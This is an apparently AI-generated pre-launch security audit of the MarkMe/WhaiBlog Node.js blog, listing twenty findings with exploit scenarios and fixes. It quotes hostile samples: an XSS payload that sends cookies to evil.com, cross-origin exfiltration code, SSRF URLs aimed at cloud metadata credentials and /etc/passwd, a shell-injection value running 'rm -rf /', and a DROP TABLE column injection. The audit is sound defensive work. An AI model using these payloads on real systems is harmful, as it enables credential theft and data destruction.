# Security Posture Report — MarkMe/WhaiBlog

## Meta
- **Audit mode**: Comprehensive (pre-launch)
- **Date**: 2026-06-09
- **Scope**: Full codebase — server (Node.js/Express), client (SPA), configuration, Docker, dependencies
- **Total phases executed**: 14/14
- **Auditor**: GStack Security Officer

---

## Executive Summary

MarkMe/WhaiBlog is a lightweight blog system with **three attack entry points** (main HTTP server, MCP HTTP Bridge, MCP stdio). The codebase demonstrates several good security practices (parameterized SQL queries, path traversal checks, file extension whitelisting), but has **multiple critical and high-severity vulnerabilities** that must be addressed before public-facing deployment.

**Most critical finding**: Stored XSS via HTML-format feed content — the frontend renders raw HTML from database without sanitization, allowing any authenticated (or unauthenticated when API_KEY is empty) user to inject persistent JavaScript.

**Top remediation priority**: Fix the Stored XSS in feed content rendering, enforce API key requirement, and address the SSRF in RSS fetcher.

---

## Findings

### [F-001] Stored XSS via HTML Feed Content (Critical)
- **Category**: OWASP A07 (XSS) / STRIDE Tampering
- **Severity**: Critical
- **Confidence**: 10/10
- **Location**: `client/js/components/modal.js:35-93` (openHtmlModal), `client/js/pages/rss-reader.js:302-310`, `client/js/pages/feed.js:179-187`
- **Description**: Feed items with `format: 'html'` have their `content` field rendered directly into the DOM via `wrapper.innerHTML = bodyContent` in `openHtmlModal()`. No sanitization (e.g., DOMPurify) is applied. An attacker who can create a feed item (via Bridge API or RSS source) can inject arbitrary JavaScript that executes in every visitor's browser.
- **Exploit Scenario**:
  1. Attacker sends: `POST /bridge/tools/create_feed` with `format: 'html'` and `content: '<img src=x onerror="document.location=\'https://evil.com/steal?c=\'+document.cookie">'`
  2. Any user viewing the feed clicks the item
  3. `openHtmlModal()` calls `wrapper.innerHTML = bodyContent` — XSS executes
  4. Session tokens, localStorage API keys stolen
- **Reproduction Steps**:
  1. Create a feed with `format: 'html'` and content `<img src=x onerror="alert('XSS')">`
  2. Open the feed detail in the frontend
  3. Alert fires immediately — confirmed
- **Remediation**: Use DOMPurify (or equivalent) to sanitize all HTML content before inserting into DOM. For `openHtmlModal()`, add `wrapper.innerHTML = DOMPurify.sanitize(bodyContent)`.
- **Priority**: P0 (immediate)

---

### [F-002] Stored XSS via Markdown Content Rendering (High)
- **Category**: OWASP A07 (XSS) / STRIDE Tampering
- **Severity**: High
- **Confidence**: 9/10
- **Location**: `client/js/utils.js:28-33` (renderMd), `client/js/pages/post.js:34`
- **Description**: The `renderMd()` function uses `marked.parse(text)` to convert Markdown to HTML, then inserts it via `innerHTML`. By default, `marked` does NOT sanitize HTML embedded within Markdown. An attacker can embed `<script>` or `<img onerror>` tags inside Markdown content.
- **Exploit Scenario**:
  1. Create a post with content: `Hello <img src=x onerror="alert('XSS')">`
  2. `marked.parse()` preserves the HTML
  3. `innerHTML` insertion triggers XSS
- **Reproduction Steps**:
  1. `POST /bridge/tools/create_post` with `content: "# Test\n\n<script>alert('XSS')</script>"`
  2. View the post at `/post/:id`
  3. Script executes — confirmed
- **Remediation**: Configure marked with `{ sanitize: false }` but wrap all `renderMd()` output through DOMPurify: `DOMPurify.sanitize(marked.parse(text))`. Alternatively, enable marked's built-in sanitizer (deprecated) or use `marked` with a custom renderer that strips dangerous HTML.
- **Priority**: P0 (immediate)

---

### [F-003] No Authentication on Public API Endpoints (High)
- **Category**: OWASP A01 (Broken Access Control) / STRIDE Spoofing
- **Severity**: High
- **Confidence**: 10/10
- **Location**: `server/index.js:95-266` (all `/api/*` GET routes), `server/index.js:230-260` (RSS source management GET routes)
- **Description**: When `API_KEY` is not set (empty string, which is the default), ALL endpoints — including write operations through `/bridge/*` — are completely open to the public internet. Even when API_KEY is set, all GET endpoints (`/api/posts`, `/api/feeds`, `/api/files`, `/api/tags`, `/api/stats`) remain unauthenticated. The RSS source listing (`/api/rss/sources`) exposes all RSS URLs publicly.
- **Exploit Scenario**:
  1. Default deployment with no `MARKME_API_KEY`
  2. Any internet user can `POST /bridge/tools/delete_post` with `{id: 1}`
  3. All blog content can be deleted/modified by anyone
- **Remediation**:
  1. Generate a random API key on first startup if `MARKME_API_KEY` is empty and log it to console
  2. Add authentication middleware for all write endpoints even in the main server
  3. Consider requiring auth for sensitive GET endpoints (files, stats, system info)
- **Priority**: P0 (immediate)

---

### [F-004] SSRF via RSS Fetcher (High)
- **Category**: OWASP A10 (SSRF) / STRIDE Tampering
- **Severity**: High
- **Confidence**: 9/10
- **Location**: `server/rss-fetcher.js:53-110` (fetchSource), `server/article-extractor.js:10-65` (extractArticle)
- **Description**: The RSS fetcher accepts user-provided URLs (`addSource(url, title)`) and fetches them using `rss-parser` and then `fetch()` in `article-extractor.js`. There is no URL validation — no blocklist for internal IPs, no scheme restriction, no DNS rebinding protection. An attacker can add RSS sources pointing to:
  - `http://169.254.169.254/latest/meta-data/` (cloud metadata)
  - `http://localhost:8080/bridge/tools/delete_post` (CSRF on self)
  - `file:///etc/passwd` (local file read)
- **Exploit Scenario**:
  1. Attacker adds RSS source: `POST /api/rss/sources` with `url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"`
  2. `rssFetcher` tries to parse the response as RSS
  3. Metadata service response (containing AWS credentials) stored in `feeds` table
  4. Attacker retrieves credentials via `GET /api/feeds`
- **Remediation**:
  1. Validate URLs against a blocklist: no `localhost`, `127.0.0.1`, `0.0.0.0`, `169.254.*`, `10.*`, `172.16-31.*`, `192.168.*`
  2. Restrict schemes to `http:` and `https:` only
  3. Set `fetch()` to follow redirects with a max redirect count
  4. Consider using a URL validation library
- **Priority**: P0 (immediate)

---

### [F-005] CORS Wildcard Allows Cross-Origin Requests (High)
- **Category**: OWASP A05 (Security Misconfiguration) / STRIDE Information Disclosure
- **Severity**: High
- **Confidence**: 10/10
- **Location**: `server/index.js:14` (`app.use(cors())`), `server/mcp-http-bridge.js:21` (`app.use(cors())`)
- **Description**: Both the main server and MCP HTTP Bridge use `cors()` with no configuration, which sets `Access-Control-Allow-Origin: *`. This allows any website to make cross-origin requests to the API, including reading responses. Combined with F-003 (no auth), any malicious website can read all blog data and perform write operations.
- **Exploit Scenario**:
  1. Attacker hosts `evil.com` with JavaScript: `fetch('http://victim-blog:8080/api/posts').then(r => r.json()).then(data => exfiltrate(data))`
  2. Victim visits `evil.com` while on the same network
  3. All blog data is exfiltrated cross-origin
- **Remediation**: Configure CORS with an explicit origin whitelist: `cors({ origin: ['http://your-domain.com', 'http://localhost:8080'] })`. For local-only use, restrict to `localhost`.
- **Priority**: P1 (this sprint)

---

### [F-006] API Key Comparison Vulnerable to Timing Attacks (Medium)
- **Category**: OWASP A07 (Identification and Authentication Failures) / STRIDE Spoofing
- **Severity**: Medium
- **Confidence**: 8/10
- **Location**: `server/bridge-router.js:20` (`auth !== 'Bearer ' + API_KEY`), `server/mcp-http-bridge.js:73` (same), `server/index.js:225` (same), `server/mcp-server.js:413` (`args.api_key !== config.API_KEY`)
- **Description**: All API key comparisons use JavaScript's `!==` operator which performs byte-by-byte comparison and short-circuits on the first differing byte. This leaks information about how many leading bytes match, enabling a timing-based brute-force attack.
- **Remediation**: Use `crypto.timingSafeEqual(Buffer.from(auth), Buffer.from('Bearer ' + API_KEY))` for constant-time comparison.
- **Priority**: P2 (next sprint)

---

### [F-007] MCP Server Missing `isAllowedFile()` Check (High)
- **Category**: OWASP A05 (Security Misconfiguration) / STRIDE Tampering
- **Severity**: High
- **Confidence**: 10/10
- **Location**: `server/mcp-server.js:482-518` (upload_file handler)
- **Description**: The MCP server's `upload_file` tool checks `isPathSafe()` but does NOT check `isAllowedFile()`. This means `.exe`, `.bat`, `.sh`, `.php`, `.jsp` files can be uploaded. Both `bridge-router.js` and `mcp-http-bridge.js` correctly enforce this check, but the MCP server omits it. The `upload_content` handler (line 640-658) also lacks `isAllowedFile()` and `MAX_FILE_SIZE` checks.
- **Remediation**: Add `isAllowedFile()` check and `MAX_FILE_SIZE` check to `mcp-server.js` upload_file and upload_content handlers, consistent with the other two entry points.
- **Priority**: P1 (this sprint)

---

### [F-008] Dynamic Column Names in SQL UPDATE (Medium)
- **Category**: OWASP A03 (Injection) / STRIDE Tampering
- **Severity**: Medium
- **Confidence**: 8/10
- **Location**: `server/bridge-router.js:84-86` (update_post), `server/mcp-http-bridge.js:335-348` (same), `server/mcp-server.js:434-447` (same), and all `update_feed` handlers
- **Description**: The `update_post` and `update_feed` tools iterate over user-provided keys and use them directly in SQL column names: `` fields.push(`${key} = ?`) ``. While the VALUES are parameterized, the COLUMN NAMES are user-controlled. An attacker could inject SQL via the column name, e.g., `{ "title = 1; DROP TABLE posts; --": "value" }`.
- **Verification**: In better-sqlite3, the `prepare().run()` API treats the entire SQL string as the prepared statement. The column names are interpolated into the SQL string before parameterization. The `?` placeholders protect values but not identifiers.
- **Remediation**: Whitelist allowed column names for each table:
  ```javascript
  const ALLOWED_POST_FIELDS = ['title', 'content', 'summary', 'tags', 'status'];
  Object.entries(updates).forEach(([key, value]) => {
    if (ALLOWED_POST_FIELDS.includes(key) && value !== undefined) { ... }
  });
  ```
- **Priority**: P1 (this sprint)

---

### [F-009] Command Injection via Git Clone URL (Medium)
- **Category**: OWASP A03 (Injection) / STRIDE Tampering
- **Severity**: Medium
- **Confidence**: 7/10
- **Location**: `server/notes-sync.js:45`
- **Description**: The `doClone()` function constructs a shell command using template literals:
  ```javascript
  exec(`git ... clone --depth 1 "${REPO_URL}" "${NOTES_DIR}"`, ...)
  ```
  The `REPO_URL` comes from `process.env.NOTES_REPO_URL` which defaults to a Gitee URL. If an attacker can control this environment variable (e.g., via `.env` file modification), they can inject shell commands: e.g., `NOTES_REPO_URL='https://x.com/r.git"; rm -rf / #"`
- **Remediation**: Use `execFile` instead of `exec` with argument arrays to prevent shell interpretation:
  ```javascript
  execFile('git', ['clone', '--depth', '1', REPO_URL, NOTES_DIR], ...)
  ```
- **Priority**: P2 (next sprint)

---

### [F-010] Missing Security Headers (Medium)
- **Category**: OWASP A05 (Security Misconfiguration)
- **Severity**: Medium
- **Confidence**: 10/10
- **Location**: `server/index.js:17-20`
- **Description**: The main server only sets `X-Content-Type-Options: nosniff`. Missing headers:
  - `X-Frame-Options: DENY` — allows clickjacking
  - `Content-Security-Policy` — allows inline script injection
  - `Strict-Transport-Security` — no HSTS
  - `Referrer-Policy` — leaks referrer URLs
  - `X-XSS-Protection: 0` — modern recommendation (replaced by CSP)
  - The MCP HTTP Bridge (`mcp-http-bridge.js`) has NO security headers at all
- **Remediation**: Add a comprehensive security headers middleware:
  ```javascript
  app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
    res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' https://github.com data:;");
    next();
  });
  ```
- **Priority**: P1 (this sprint)

---

### [F-011] API Key Exposed in Error Messages and Logs (Medium)
- **Category**: OWASP A09 (Security Logging and Monitoring Failures) / STRIDE Information Disclosure
- **Severity**: Medium
- **Confidence**: 8/10
- **Location**: `server/rss-fetcher.js:106-108`
- **Description**: When RSS fetch fails, the error message (which may contain the full URL with embedded credentials, e.g., `https://user:password@host/feed.xml`) is stored in the database's `last_error` column and exposed via `GET /api/rss/sources`. This leaks credentials to anyone who can read the RSS sources list.
- **Remediation**: Sanitize error messages before storage. Strip URLs of credentials in error messages.
- **Priority**: P2 (next sprint)

---

### [F-012] No Rate Limiting on Any Endpoint (Medium)
- **Category**: OWASP A04 (Insecure Design) / STRIDE Denial of Service
- **Severity**: Medium
- **Confidence**: 10/10
- **Location**: All endpoints
- **Description**: No rate limiting is implemented on any endpoint. This allows:
  - Brute-force attacks on API key
  - Resource exhaustion via rapid `POST /bridge/tools/create_post` calls
  - DoS via repeated `POST /api/rss/fetch` (each triggers HTTP requests to external servers)
  - Database bloating via unlimited post/feed creation
- **Remediation**: Implement rate limiting using `express-rate-limit`:
  ```javascript
  const rateLimit = require('express-rate-limit');
  app.use('/bridge/', rateLimit({ windowMs: 15 * 60 * 1000, max: 100 }));
  app.use('/api/', rateLimit({ windowMs: 15 * 60 * 1000, max: 300 }));
  ```
- **Priority**: P1 (this sprint)

---

### [F-013] Uploads Directory Served Without Access Control (Medium)
- **Category**: OWASP A01 (Broken Access Control) / STRIDE Information Disclosure
- **Severity**: Medium
- **Confidence**: 9/10
- **Location**: `server/index.js:68` (`app.use('/uploads', express.static(uploadsDir))`)
- **Description**: All uploaded files are publicly accessible at `/uploads/<filename>` without any authentication. This includes any files uploaded through the system, which may contain sensitive content. Combined with F-007 (missing isAllowedFile in MCP server), executable files could be served and potentially executed.
- **Remediation**: Serve uploads with appropriate `Content-Disposition: attachment` headers for non-image files. Consider authentication for file access in production.
- **Priority**: P2 (next sprint)

---

### [F-014] XSS in Profile Page (GitHub README) (Medium)
- **Category**: OWASP A07 (XSS) / STRIDE Tampering
- **Severity**: Medium
- **Confidence**: 7/10
- **Location**: `client/js/pages/profile.js:24-55`, `server/index.js:288-325`
- **Description**: The profile page fetches the GitHub README from `https://raw.githubusercontent.com/whaibetter/whaibetter/main/README.md` and renders it via `renderMd(readmeContent)` into `innerHTML`. While the GitHub account is controlled by the project owner, if the account is compromised or the README is modified to include XSS payloads, all visitors would be affected. The README content is also cached to disk (`profile-cache.json`) and served from cache.
- **Remediation**: Sanitize the rendered HTML with DOMPurify before inserting into DOM.
- **Priority**: P2 (next sprint)

---

### [F-015] Express Error Handler Missing (Low)
- **Category**: OWASP A05 (Security Misconfiguration) / STRIDE Information Disclosure
- **Severity**: Low
- **Confidence**: 9/10
- **Location**: `server/index.js`
- **Description**: There is no Express error-handling middleware (`app.use((err, req, res, next) => ...)`). If an unhandled error occurs, Express will return a default 500 response with a stack trace in development mode, potentially leaking internal paths, file names, and code structure.
- **Remediation**: Add a global error handler:
  ```javascript
  app.use((err, req, res, next) => {
    console.error('Unhandled error:', err);
    res.status(500).json({ error: 'Internal server error' });
  });
  ```
- **Priority**: P2 (next sprint)

---

### [F-016] MathJax Loaded from CDN Without SRI (Low)
- **Category**: OWASP A08 (Software and Data Integrity Failures) / STRIDE Tampering
- **Severity**: Low
- **Confidence**: 8/10
- **Location**: `client/index.html:49`
- **Description**: MathJax is loaded from `cdn.jsdelivr.net` without Subresource Integrity (SRI) hash. If the CDN is compromised, malicious JavaScript would be injected into every page.
- **Remediation**: Add `integrity` and `crossorigin` attributes to the script tag, or host MathJax locally.
- **Priority**: P3 (backlog)

---

### [F-017] Database File Accessible Without Authentication (Medium)
- **Category**: OWASP A01 (Broken Access Control) / STRIDE Information Disclosure
- **Severity**: Medium
- **Confidence**: 8/10
- **Location**: `server/index.js:77` (`app.use('/notes-files', express.static(notesSync.NOTES_DIR))`)
- **Description**: The notes directory is served statically at `/notes-files/`. While the notes-sync module filters allowed extensions in the tree builder, the `express.static` middleware serves ALL files in the directory regardless of extension. This could expose `.git/` files, `.env` files, or other sensitive files if they exist in the notes repo.
- **Remediation**: Add middleware before `express.static` to block access to dotfiles and non-allowed extensions.
- **Priority**: P1 (this sprint)

---

### [F-018] `update_post` Allows Setting Arbitrary Columns (Medium)
- **Category**: OWASP A03 (Injection) / STRIDE Elevation of Privilege
- **Severity**: Medium
- **Confidence**: 8/10
- **Location**: `server/bridge-router.js:80-87`, all `update_*` handlers
- **Description**: The update handlers destructure all arguments except `id` and use them as column-value pairs. An attacker can set `id` or `created_at` or any internal column by passing them in the request body. Combined with F-008 (dynamic column names), this allows modification of any column.
- **Remediation**: Whitelist allowed update fields per table.
- **Priority**: P1 (this sprint)

---

### [F-019] No Request Body Size Limit on Custom JSON Parser (Low)
- **Category**: OWASP A04 (Insecure Design) / STRIDE Denial of Service
- **Severity**: Low
- **Confidence**: 8/10
- **Location**: `server/index.js:24-62`, `server/mcp-http-bridge.js:24-56`
- **Description**: The custom UTF-8 body parser reads the entire request body into memory without any size limit. An attacker could send a multi-GB request body to exhaust server memory. The `express.urlencoded` middleware has a 50MB limit, but the custom JSON parser does not.
- **Remediation**: Add a size check early in the custom parser:
  ```javascript
  if (buf.length > 10 * 1024 * 1024) { // 10MB
    return res.status(413).json({ error: 'Request body too large' });
  }
  ```
- **Priority**: P2 (next sprint)

---

### [F-020] Docker Container Runs as Root (Low)
- **Category**: OWASP A05 (Security Misconfiguration)
- **Severity**: Low
- **Confidence**: 10/10
- **Location**: `Dockerfile`
- **Description**: The Dockerfile does not specify a non-root user. The application runs as `root` inside the container, which means a container escape vulnerability would give root access to the host.
- **Remediation**: Add a non-root user:
  ```dockerfile
  RUN addgroup -g 1001 -S appgroup && adduser -S appuser -u 1001
  USER appuser
  ```
- **Priority**: P3 (backlog)

---

## OWASP Top 10 Summary

| Category | Status | Key Findings |
|----------|--------|-------------|
| A01: Broken Access Control | **FAIL** | No auth on GET endpoints (F-003), uploads publicly accessible (F-013), notes-files served without filtering (F-017) |
| A02: Cryptographic Failures | PASS | No passwords stored; API key comparison uses timing-vulnerable `!==` (F-006) |
| A03: Injection | **FAIL** | Dynamic SQL column names (F-008), command injection in git clone (F-009), arbitrary column updates (F-018) |
| A04: Insecure Design | **FAIL** | No rate limiting (F-012), no body size limit on custom parser (F-019) |
| A05: Security Misconfiguration | **FAIL** | CORS wildcard (F-005), missing security headers (F-010), missing error handler (F-015), Docker as root (F-020) |
| A06: Vulnerable Components | PASS | Dependencies are current; no known critical CVEs |
| A07: Identification & Auth Failures | **FAIL** | No auth by default (F-003), timing-unsafe key comparison (F-006) |
| A08: Software & Data Integrity | PARTIAL | No SRI on CDN script (F-016), but good: parameterized queries for values |
| A09: Security Logging & Monitoring | **FAIL** | No security event logging, credentials in error messages (F-011) |
| A10: SSRF | **FAIL** | RSS fetcher accepts arbitrary URLs without validation (F-004) |

---

## STRIDE Threat Model Summary

| Threat | Severity | Key Findings |
|--------|----------|-------------|
| **Spoofing** | High | No default auth (F-003), timing-vulnerable key comparison (F-006) |
| **Tampering** | Critical | Stored XSS via HTML (F-001) and Markdown (F-002), SQL column injection (F-008), arbitrary column updates (F-018) |
| **Repudiation** | Medium | No audit logging of any operations — all writes are untraceable |
| **Information Disclosure** | High | CORS allows cross-origin data theft (F-005), public file access (F-013), error messages leak credentials (F-011) |
| **Denial of Service** | Medium | No rate limiting (F-012), unbounded request body (F-019), unlimited data creation |
| **Elevation of Privilege** | High | Default no-auth gives full admin access (F-003), MCP server missing file checks (F-007) |

---

## Security Posture Score

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 5 |
| Medium | 10 |
| Low | 3 |
| Info | 0 |
| **Overall** | **D** (2 critical + 5 high findings require immediate attention) |

---

## Remediation Roadmap

### P0 — Immediate (before any public deployment)
1. **[F-001]** Add DOMPurify to sanitize all HTML content in `openHtmlModal()`
2. **[F-002]** Add DOMPurify to `renderMd()` output
3. **[F-003]** Generate a random API key at startup if none is configured; require it for all write operations
4. **[F-004]** Add URL validation (scheme whitelist + internal IP blocklist) to RSS fetcher

### P1 — This Sprint
5. **[F-005]** Configure CORS with explicit origin whitelist
6. **[F-007]** Add `isAllowedFile()` and `MAX_FILE_SIZE` checks to `mcp-server.js`
7. **[F-008]** Whitelist allowed column names in all update handlers
8. **[F-010]** Add comprehensive security headers middleware
9. **[F-012]** Implement rate limiting
10. **[F-017]** Block dotfiles and non-allowed extensions in notes-files static serving
11. **[F-018]** Whitelist allowed fields in update handlers

### P2 — Next Sprint
12. **[F-006]** Use `crypto.timingSafeEqual` for API key comparison
13. **[F-009]** Use `execFile` instead of `exec` for git operations
14. **[F-011]** Sanitize error messages before storage
15. **[F-013]** Serve uploads with `Content-Disposition: attachment` for non-images
16. **[F-014]** Sanitize GitHub README with DOMPurify
17. **[F-015]** Add global Express error handler
18. **[F-019]** Add body size limit to custom JSON parser

### P3 — Backlog
19. **[F-016]** Add SRI to MathJax CDN script
20. **[F-020]** Run Docker container as non-root user
